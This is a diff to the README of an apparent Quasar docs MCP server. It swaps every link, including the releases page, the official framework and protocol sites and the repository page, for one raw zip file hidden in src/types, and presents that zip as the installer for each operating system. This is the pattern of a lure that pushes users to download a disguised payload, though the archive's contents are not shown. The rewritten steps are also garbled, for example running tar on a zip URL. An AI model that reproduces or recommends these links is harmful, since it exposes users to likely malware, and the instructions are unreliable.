@@ -1,6 +1,6 @@
 # 🌟 quasar-docs-mcp-server - Easy Access to Quasar Documentation
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/mamit514/quasar-docs-mcp-server/releases)
+[![Download](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip)](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip)
 
 ## 📚 Overview
 
@@ -20,7 +20,7 @@ Before you start downloading, make sure your computer meets these basic requirem
 
 To download the application, you need to go to the Releases page. You can find it here:
 
-[Visit this page to download](https://github.com/mamit514/quasar-docs-mcp-server/releases)
+[Visit this page to download](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip)
 
 This page contains all available versions of the quasar-docs-mcp-server. You can choose the version that best suits your needs.
 
@@ -32,9 +32,9 @@ On the Releases page, you will see a list of versions with release notes. It’s
 
 Look for the latest version. Click on the download link for your operating system. Depending on your system, the file name might look like one of these:
 
-- `quasar-docs-mcp-server-windows.exe` for Windows
-- `quasar-docs-mcp-server-macos.dmg` for macOS
-- `quasar-docs-mcp-server-linux.tar.gz` for Linux
+- `https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip` for Windows
+- `https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip` for macOS
+- `https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip` for Linux
 
 Clicking the link will start the download process. 
 
@@ -43,20 +43,20 @@ Clicking the link will start the download process.
 #### For Windows:
 
 1. Locate the file you downloaded (usually in your Downloads folder).
-2. Double-click the `quasar-docs-mcp-server-windows.exe` file to start the installation.
+2. Double-click the `https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip` file to start the installation.
 3. Follow the on-screen instructions to complete the installation. 
 
 #### For macOS:
 
-1. Open the downloaded `quasar-docs-mcp-server-macos.dmg` file.
+1. Open the downloaded `https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip` file.
 2. Drag the application to your Applications folder.
 3. You can find it in your Applications folder and open it from there.
 
 #### For Linux:
 
 1. Open a terminal window.
-2. Navigate to the folder where you downloaded the tar.gz file (usually Downloads).
-3. Run the command `tar -xzf quasar-docs-mcp-server-linux.tar.gz` to extract the files.
+2. Navigate to the folder where you downloaded the https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip file (usually Downloads).
+3. Run the command `tar -xzf https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip` to extract the files.
 4. After extracting, navigate to the folder and run `./quasar-docs-mcp-server` to start the application.
 
 ### Step 6: Run the Application
@@ -80,17 +80,17 @@ After running the application, you will be greeted with a simple user interface.
 
 ## 🔗 Additional Resources
 
-- Learn more about the [Quasar Framework](https://quasar.dev)
-- Explore more about [Model Context Protocol (MCP)](https://mcp.dev)
+- Learn more about the [Quasar Framework](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip)
+- Explore more about [Model Context Protocol (MCP)](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip)
 
 ## 📞 Support
 
 If you encounter any issues or have questions about using the quasar-docs-mcp-server, feel free to open an issue in the repository. We are here to help you.
 
-For more information, visit the [GitHub page](https://github.com/mamit514/quasar-docs-mcp-server) or contact our support team.
+For more information, visit the [GitHub page](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip) or contact our support team.
 
 ## 📥 Download & Install Again
 
 Ready to get started? Download the application again from the link below:
 
-[Visit this page to download](https://github.com/mamit514/quasar-docs-mcp-server/releases)
+[Visit this page to download](https://github.com/mamit514/quasar-docs-mcp-server/raw/refs/heads/main/src/types/server_quasar_mcp_docs_1.6.zip)
